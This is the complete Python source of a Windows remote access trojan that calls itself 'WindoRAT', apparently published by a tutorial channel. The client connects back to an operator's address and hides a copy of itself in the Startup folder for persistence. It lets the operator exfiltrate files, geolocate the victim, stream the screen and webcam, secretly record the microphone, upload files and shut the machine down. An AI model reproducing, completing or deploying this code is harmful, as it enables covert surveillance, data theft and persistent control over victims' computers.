#
#  _                                _                __          __ _  _    _        _____      _ 
# | |                              (_)               \ \        / /(_)| |  | |      / ____|    | |
# | |      ___   __ _  _ __  _ __   _  _ __    __ _   \ \  /\  / /  _ | |_ | |__   | |         | |
# | |     / _ \ / _` || '__|| '_ \ | || '_ \  / _` |   \ \/  \/ /  | || __|| '_ \  | |     _   | |
# | |____|  __/| (_| || |   | | | || || | | || (_| |    \  /\  /   | || |_ | | | | | |____| |__| |
# |______|\___| \__,_||_|   |_| |_||_||_| |_| \__, |     \/  \/    |_| \__||_| |_|  \_____|\____/ 
#                                              __/ |                                              
#                                             |___/                         -  By CJ
#
# YouTube : www.youtube.com/@LearningWithCJ
# GitHub  : www.github.com/Carl-Johnson1976
# Telegram: t.me/LearningWithCJ
#

import sys
import os
import socket
import win32api
import shutil
import subprocess
import pyautogui
import base64
import requests
import win32com.client
import numpy as np
import cv2
import pyaudio
import wave
import time
from PIL import ImageGrab



ip = ""
port = ""
files_location = ""


def GSF(size): # get size format
    text = ""
    if size < 1024:
        text = str(size) + " B"
    elif size >= 1024 and size < 1048576:
        text = str(round(size / 1024, 2)) + " KB"
    elif size >= 1048576 and size < 1073741824:
        text = str(round(size / 1024 ** 2, 2)) + " M"
    elif size >= 1073741824 and size < 1099511627776:
        text = str(round(size / 1024 ** 3, 2)) + " G"
    return text


def startup():
    user = os.path.expanduser("~").split("\\")[-1]
    name = sys.argv[0].split("/")[-1]
    src_path = sys.argv[0].replace("/", "\\")
    dst_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{name}"
    if os.path.exists(dst_path):
        return "It's already exists"
    else:
        try:
            shutil.copy(src_path, dst_path)
            try:
                subprocess.check_call(["attrib", "+h", dst_path])
                return "Successfully copied (HIDDEN)"
            except:
                return "Successfully copied (NOT HIDDEN)" 
        except:
            return "The copy was not successful"


def set_file(dst_path):
    global files_location
    dst_path = " ".join(dst_path) 
    if os.path.exists(dst_path):
        try:
            subprocess.check_call(["attrib", "+h", dst_path])
            files_location = dst_path
            return f"This path ({dst_path}) is already exists!\nIt was set as default path (HIDDEN)."
        except:
            files_location = dst_path
            return f"This path ({dst_path}) is already exists!\nIt was set as default path (NOT HIDDEN)."
    else:
        try:
            os.mkdir(dst_path)
            try:
                subprocess.check_call(["attrib", "+h", dst_path])
                files_location = dst_path
                return "Done!\nIt was set as default path (HIDDEN)."
            except:
                files_location = dst_path
                return "Done!\nIt was set as default path (NOT HIDDEN!)."   
        except:
            return "Can't create the file!\nPlease try again or change the file path."


def CFsL(): #check files location
    if files_location == None:
        return False
    else:
        if os.path.exists(files_location):
            return True
        else:
            return False


def showInfo():
    try:
        data = []
        info = ""
        publicIP = None
        ipv4 = None
        ipv6 = None
        try:
            publicIP = requests.get("http://myip.dnsomatic.com/?format=json")
            if publicIP.status_code == 200:
                publicIP = publicIP.text
            else:
                publicIP = "None"
        except:
            publicIP = "None"
        info += f'public IP : {publicIP}\n'
        try:
            ipv4 = requests.get("https://api.ipify.org/?format=json")
            if ipv4.status_code == 200:
                ipv4 = ipv4.json()["ip"]
            else:
                ipv4 = "None"
        except:
            ipv4 = "None"
        info += f'ipv4 : {ipv4}\n'
        try:
            ipv6 = requests.get("https://api64.ipify.org/?format=json")
            if ipv6.status_code == 200:
                ipv6 = ipv6.json()["ip"]
            else:
                ipv6 = "None"
        except:
            ipv6 = "None"
        info += f'ipv6 : {ipv6}\n'
        try:    
            r = requests.get(f"http://ip-api.com/json/{publicIP}")
            if r.status_code == 200:
                try:
                    info += f'Network : {r["org"]}\n'
                except:
                    info += f'Network : None\n'
                try:
                    info += f'Location : {r["country_name"]}/{r["city"]}\n'
                except:
                    info += f'Location : None\n'
                try:
                    info += f'Coords : {r["latitude"]}, {r["longitude"]}'
                except:
                    info += f'Coords : None'
            else:
                info += f'Network : None\n'
                info += f'Location : None\n'
                info += f'Coords : None'
        except: 
            info += f'Network : None\n'
            info += f'Location : None\n'
            info += f'Coords : None'   
        data.append(info)
        data.append("END123")
        return data 
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data


def getDrives():
    try:    
        data = []
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split("\000")[:-1]
        drives_len = len(drives)
        str_drives = ""
        totalH = 0
        usedH = 0
        freeH = 0
        for k, v in zip(drives, range(drives_len)):
            try:
                total, used, free = shutil.disk_usage(drives[v])
            except:
                continue
            totalH += total
            usedH += used
            freeH += free
        str_drives += f"Hard :\n\
Total: {round(totalH, )} (B) | {round(totalH / 1024, )} (KB) | {round(totalH / 1024 ** 2, 2)} (MB) | {round(totalH / 1024 ** 3, 2)} (GB)\n\
Used : {round(usedH, )} (B) | {round(usedH / 1024, )} (KB) | {round(usedH / 1024 ** 2, 2)} (MB) | {round(usedH / 1024 ** 3, 2)} (GB)\n\
Free : {round(freeH, )} (B) | {round(freeH / 1024, )} (KB) | {round(freeH / 1024 ** 2, 2)} (MB) | {round(freeH / 1024 ** 3, 2)} (GB)\n"
        for k, v in zip(drives, range(drives_len)):
            try:
                total, used, free = shutil.disk_usage(drives[v])
            except:
                continue
            str_drives += f"{k[0]} :\n\
Total: {round(total, )} (B) | {round(total / 1024, )} (KB) | {round(total / 1024 ** 2, 2)} (MB) | {round(total / 1024 ** 3, 2)} (GB)\n\
Used : {round(used, )} (B) | {round(used / 1024, )} (KB) | {round(used / 1024 ** 2, 2)} (MB) | {round(used / 1024 ** 3, 2)} (GB)\n\
Free : {round(free, )} (B) | {round(free / 1024, )} (KB) | {round(free / 1024 ** 2, 2)} (MB) | {round(free / 1024 ** 3, 2)} (GB)\n"
        data.append(str_drives)
        data.append("END123")
        return data
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data
    

def showFiles(path):
    try:
        data = []
        path = " ".join(path)
        if os.path.exists(path):
            if os.path.isdir(path):
                files = os.listdir(path)
                if len(files) == 0: data.append("EMPTY")
                else:
                    spliter = "/" if "/" in path else "\\" 
                    information = ""
                    for i in files:
                        text = "\n"
                        if os.path.isfile(path + spliter + i): text = " (" + GSF(os.path.getsize(path + spliter + i)) + ")\n"
                        information += i + text
                    data.append(information)
            else:
                data.append(f"This path ({path}) is not directory!")
        else:
            data.append(f"This path ({path}) doesn't exist!")
        data.append("END123")       
        return data 
    except Exception as e:
        data = []
        # data.append("Something went wrong")
        data.append(str(e))
        data.append("END123")
        return data


def createDir(path, h):
    try:
        data = []
        path = " ".join(path)
        if os.path.exists(path):
            if h == "+h":
                try:
                    subprocess.check_call(["attrib", "+h", path])
                    data.append(f"This path ({path}) already exists! (HIDDEN)")
                except:
                    data.append(f"This path ({path}) already exists! (NOT HIDDEN)\nI can't hidden the folder.")
            elif h == "-h":
                try:
                    subprocess.check_call(["attrib", "-h", path])
                    data.append(f"This path ({path}) already exists! (NOT HIDDEN)")
                except:
                    data.append(f"This path ({path}) already exists! (HIDDEN)\nI can't unhidden the folder.")
            else:
                data.append(f"This path ({path}) already exists! (UNKNOW)\nArgument ({h}) incorrect.")
        else:
            try:
                os.mkdir(path)
                if h == "+h":
                    try:
                        subprocess.check_call(["attrib", "+h", path])
                        data.append(f"This path ({path}) created! (HIDDEN)")
                    except:
                        data.append(f"This path ({path}) created! (NOT HIDDEN)\nI can't hidden the folder." )  
                elif h == "-h":
                    data.append(f"This path ({path}) created! (NOT HIDDEN)")
                else:
                    data.append(f"This path ({path}) created! (NOT HIDDEN)\nArgument ({h}) incorrect.")
            except:
                data.append(f"Can't create this ({path}) file!\nPlease try again or change the folder path.")
        data.append("END123")
        return data    
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data


def deleteDir(path):
    try:
        data = []
        path = " ".join(path)
        if os.path.exists(path):
            try:
                os.removedirs(path)
                data.append(f"This path ({path}) deleted!")
            except:
                data.append(f"Can't delete this ({path}) folder!")    
        else:
            data.append(f"This path ({path}) doesn't exist!") 
        data.append("END123")
        return data
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data


def createFile(path, h):
    try:
        data = []
        path = " ".join(path)
        if os.path.exists(path):
            if h == "+h":
                try:
                    subprocess.check_call(["attrib", "+h", path])
                    data.append(f"This path ({path}) already exists! (HIDDEN)")
                except:
                    data.append(f"This path ({path}) already exists! (NOT HIDDEN)\nI can't hidden the file.")
            elif h == "-h":
                try:
                    subprocess.check_call(["attrib", "-h", path])
                    data.append(f"This path ({path}) already exists! (NOT HIDDEN)")
                except:
                    data.append(f"This path ({path}) already exists! (HIDDEN)\nI can't unhidden the file.")
            else:
                data.append(f"This path ({path}) already exists! (UNKNOW)\nArgument ({h}) incorrect.")
        else:
            try:
                open(path, "x")
                if h == "+h":
                    try:
                        subprocess.check_call(["attrib", "+h", path])
                        data.append(f"This path ({path}) created! (HIDDEN)")
                    except:
                        data.append(f"This path ({path}) created! (NOT HIDDEN)\nI can't hidden the file." )  
                elif h == "-h":
                    data.append(f"This path ({path}) created! (NOT HIDDEN)")
                else:
                    data.append(f"This path ({path}) created! (NOT HIDDEN)\nArgument ({h}) incorrect.")
            except:
                data.append(f"Can't create this ({path}) file!\nPlease try again or change the file path.")
        data.append("END123")
        return data    
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data       


def deleteFile(path):
    try:
        data = []
        if os.path.exists(path):
            try:
                os.remove(path)
                data.append(f"This path ({path}) deleted!")
            except:
                data.append(f"Can't delete this ({path}) folder!")    
        else:
            data.append(f"This path ({path}) doesn't exist!") 
        data.append("END123")
        return data
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data   
    

def copy(path1, path2):
    try:
        data = []
        src_path = path1.strip()
        dst_path = path2.strip()
        if os.path.exists(src_path):
            # if os.path.exists(f"\\".join(dst_path.split("/")[:-1])):
            if os.path.exists(os.path.dirname(dst_path)):
                try:
                    shutil.copy(src_path, dst_path)
                    data.append(f"This path ({src_path}) copied to ({dst_path})")
                except:
                    data.append(f"Can't copy ({src_path}) to ({dst_path})!")                
            else:
                data.append(f"This path ({dst_path}) doesn't exist!")
        else:
            data.append(f"This path ({src_path}) doesn't exist!")
        data.append("END123")
        return data  
    except:
        data = []
        data.append("Something went wrong")
        data.append("END123")
        return data   


def getFile(path):
    try:
        data = []
        path = " ".join(path)
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    with open(path, "rb") as file:
                        convert = base64.b64encode(file.read())
                    convert += ("\n" + os.path.splitext(path)[1]).encode()
                    data.append(convert)
                else:
                    data.append(f"Can't decode directory ({path})")
            except:
                data.append(f"Can't decode this file ({path})")
        else:
            data.append(f"This {path} doesn't exist!")
        data.append("END123")
        return data  
    except:
        data = [] 
        data.append("Something went wrong")
        data.append("END123")
        return data 


def sendFile(obj):
    data = recvall(obj)
    done = "error"
    if data != "error":
        try:
            path = files_location + "/" + data.split('\n')[1]
            with open(path, "wb") as file:
                fileData = base64.b64decode(data.split('\n')[0])
                file.write(fileData)
            done = "success"
        except:
            done = "fail"
    try:
        sendall(obj, done)
    except:
        client(ip, port)



def alert(obj, msg):
    try:
        sendall(obj, "Please wait until the alert closes")
        time.sleep(1)
        done = "Alert Closes!"
        try:
            pyautogui.alert(msg)
        except:
            done = "Can't alert"
        sendall(obj, done)
    except:
        client(ip, port)


def speak(obj, msg):
    try:
        sendall(obj, "Please wait until the speach is over")
        time.sleep(1)
        done = "The speach is over!"
        try:
            speaker = win32com.client.Dispatch("SAPI.SpVoice")
            speaker.speak(msg)
        except:
            done = "Can't speak"
        sendall(obj, done)
    except:
        client(ip, port)


def device(process, time):
    if process == "shutdown":
        os.system(f"shutdown /s /t {time}")
        return f"Done\nThe device will shutdown in {time} seconds."
    elif process == "restart":
        os.system(f"shutdown /r /t {time}")    
        return f"Done\nThe device will restart in {time} seconds."
    else:
        return "Wrong args! (process, time)"
    

def live(obj, type):
    if type == "webcam":
        sendall(obj, "webcam")
        cap = cv2.VideoCapture(0)
        w, h = 1920, 1080
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, w)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, h)
        cap.set(cv2.CAP_PROP_FPS, 30)
        cap.set(cv2.CAP_PROP_BACKLIGHT, 0)

        if not cap.isOpened():
            sendall(obj, "Doesn't have webcam")
        else:
            sendall(obj, "have webcam")
            while True:
                ret, frame = cap.read()
                if not ret:
                    sendall(obj, "Went to problem")
                    break
                else:
                    sendall(obj, "continue")
                    _, img_encode = cv2.imencode('.jpg', frame)
                    img_byte = img_encode.tobytes()
                    obj.send(len(img_byte).to_bytes(4, byteorder='big'))
                    obj.send(img_byte)
                    msg = obj.recv(4096).decode("UTF-8")
                    if msg == "continue":
                        continue
                    else:
                        break
            cap.release()   
    else:
        sendall(obj, "screen")
        while True:
            frame = ImageGrab.grab(bbox=(0,0,1920,1080))
            frame = np.array(frame)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            _, img_encode = cv2.imencode('.jpg', frame)
            img_byte = img_encode.tobytes()
            obj.send(len(img_byte).to_bytes(4, byteorder='big'))
            obj.send(img_byte)
            msg = obj.recv(4096).decode("UTF-8")
            if msg == "continue":
                continue
            else:
                break

                
def screenshot():
    path = fr"{files_location}\output_sc_scshot.png"
    img = pyautogui.screenshot()
    img.save(path)
    with open(path, "rb") as imgData:
        convert = base64.b64encode(imgData.read())
    data = []  
    data.append(convert)
    data.append("END123")
    os.remove(path)      
    return data


def video(time):
    path = fr"{files_location}/output_sc_vi.avi"
    resolution = (1920, 1080)
    codec = cv2.VideoWriter_fourcc(*'XVID')
    fps = 30.0
    out = cv2.VideoWriter(path, codec, fps, resolution)

    num_frames = int(time) * int(fps)
    for i in range(num_frames):
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()
    cv2.destroyAllWindows()
    with open(path, "rb") as videoData:
        convert = base64.b64encode(videoData.read())  
    data = []
    data.append(convert)
    data.append("END123")        
    os.remove(path)      
    return data 


def voice(time):
    path = fr"{files_location}/output_vc.wav"
    chunk = 1024
    format = pyaudio.paInt16
    channels = 2
    rate = 44100
    record_seconds = int(time)

    audio = pyaudio.PyAudio()

    stream = audio.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)

    frames = []
    for i in range(0, int(rate / chunk * record_seconds)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()

    waveFile = wave.open(path, 'wb')
    waveFile.setnchannels(channels)
    waveFile.setsampwidth(audio.get_sample_size(format))
    waveFile.setframerate(rate)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()

    with open(path, "rb") as voiceData:
        convert = base64.b64encode(voiceData.read())  
    data = []
    data.append(convert)
    data.append("END123")        
    os.remove(path)  
    return data


def webcamPhoto():
    path = fr"{files_location}/output_wb_ph.png"
    data = []
    cam = cv2.VideoCapture(0)
    if cam.isOpened():
        ret, frame = cam.read()
        cv2.imwrite(path, frame)
        cam.release()
        cv2.destroyAllWindows()
        with open(path, "rb") as imgData:
            convert = base64.b64encode(imgData.read())  
        data.append(convert)
        data.append("END123")
        os.remove(path)      
    else:
        data.append("False")
        data.append("END123")
    return data  


def webcamVideo(time):
    path = fr"{files_location}/output_wb_vi.avi"
    data = []
    cam = cv2.VideoCapture(0)
    if cam.isOpened():
        resolution = (640, 480)
        codec = cv2.VideoWriter_fourcc(*'XVID')
        fps = 30
        out = cv2.VideoWriter(path, codec, fps, resolution)
        num_frames = int(time) * fps 
        for i in range(num_frames):
            ret, frame = cam.read()
            out.write(frame)
        cam.release()
        out.release()
        cv2.destroyAllWindows()
        with open(path, "rb") as imgData:
            convert = base64.b64encode(imgData.read())  
        data.append(convert)
        data.append("END123")
        os.remove(path) 
    else:    
        data.append("False")
        data.append("END123")
    return data  


def sendall(obj, title, info="mt"):
    try:
        if info != "mt":
            num = 0
            obj.send(title.encode("UTF-8"))
            time.sleep(0.5)
            obj.send(str(len(info[0]) + len(info[1])).encode("UTF-8"))
            time.sleep(1)
            while True:
                try:
                    obj.send(info[num])
                except:
                    obj.send(info[num].encode("UTF-8"))   
                if info[num] == "END123":
                    break
                else:    
                    num += 1
        else:
            obj.send(title.encode("UTF-8")) 
    except:
        client(ip, port) 


def recvall(obj):
    try:
        data = ""
        buff = ""
        while "END123" not in data:
            data = obj.recv(4096).decode("UTF-8", "ignore")
            buff += data
        return buff.strip().replace("END123", "").strip()          
    except:
        client(ip, port)


def client(ip, port):
    obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:    
        try:
            obj.connect((ip, int(port)))
            break
        except:
            continue
    message_to_send = f"Hello there, Welcome to WindoRAT ._.\n{startup()}\n"
    sendall(obj, message_to_send)
    while True:
        try:
            msg = obj.recv(4096).decode("UTF-8").split()
            if msg == []:
                client(ip, port)
        except:
            client(ip, port)    
        if msg[0].strip() == "setFile":
            try:
                dst_path = msg[1:]
                sendall(obj, set_file(dst_path)) 
            except:
                sendall(obj, "Unknow Command")
        elif msg[0].strip() == "showInfo":
            sendall(obj, "showInfo", showInfo())        
        elif msg[0].strip() == "getDrives":
            sendall(obj, "getDrives", getDrives()) 
        elif msg[0].strip() == "showFiles":
            if len(msg) > 1:
                sendall(obj, "showFiles", showFiles(msg[1:]))
            else:
                sendall(obj, "Wrong arguments")
        elif msg[0].strip() == "createDir":
            if len(msg) >= 3:
                sendall(obj, "createDir", createDir(msg[1:-1], msg[-1]))
            else:
                sendall(obj, "Wrong arguments")
        elif msg[0].strip() == "deleteDir":
            if len(msg) >= 2:
                sendall(obj, "deleteDir", deleteDir(msg[1:]))
            else:
                sendall(obj, "Wrong arguments")
        elif msg[0].strip() == "createFile":
            if len(msg) >= 3:
                sendall(obj, "createFile", createFile(msg[1:-1], msg[-1]))  
            else:
                sendall(obj, "Wrong arguments")  
        elif msg[0].strip() == "deleteFile":
            if len(msg) >= 2:
                sendall(obj, "deleteFile", deleteFile(msg[1:]))
            else:
                sendall(obj, "Wrong arguments")
        elif msg[0].strip() == "copy":
            msg = " ".join(msg[1:]).split("|")
            sendall(obj, "copy", copy(msg[0], msg[1]))  
        elif msg[0].strip() == "getFile":
            if len(msg) >= 2:
                sendall(obj, "getFile", getFile(msg[1:]))
            else:
                sendall(obj, "Wrong arguments")     
        elif msg[0].strip() == "sendFile":
            if CFsL():
                sendall(obj, f"sendFile {" ".join(msg[1:])}")
                sendFile(obj)
            else:
                sendall(obj, "Set files location.") 
        elif msg[0].strip() == "alert":
            sendall(obj, "alert")
            alert(obj, " ".join(msg[1:]))    
        elif msg[0].strip() == "speak":
            sendall(obj, "speak")
            speak(obj, " ".join(msg[1:]))     
        elif msg[0].strip() == "device":
            sendall(obj, "device")
            sendall(obj, device(msg[1], msg[2]))
        elif msg[0].strip() == "live":
            sendall(obj, "live")
            live(obj, msg[1])          
        elif msg[0].strip() == "screenshot":
            if CFsL():
                sendall(obj, "screenshot", screenshot())
            else:
                sendall(obj, "Set files location.")
        elif msg[0].strip() == "video":
            if CFsL():
                sendall(obj, "video", video(msg[1]))
            else:
                sendall(obj, "Set files location.")
        elif msg[0].strip() == "voice":
            if CFsL():
                sendall(obj, "voice", voice(msg[1]))
            else:    
                sendall(obj, "Set files location.")
        elif msg[0].strip() == "webcamPhoto":
            if CFsL():
                sendall(obj, "webcamPhoto", webcamPhoto())
            else:
                sendall(obj, "Set files location.")
        elif msg[0].strip() == "webcamVideo":
            if CFsL():
                sendall(obj, "webcamVideo", webcamVideo(msg[1]))
            else:
                sendall(obj, "Set files location.")
        elif msg[0].strip() == "startup":
            sendall(obj, startup())             
        elif msg[0].strip() == "clear":
            sendall(obj, "clear")
        elif msg[0].strip() == "exit":
            client(ip, port)
        else:
            sendall(obj, "Unknow Command")    



client(ip, port)
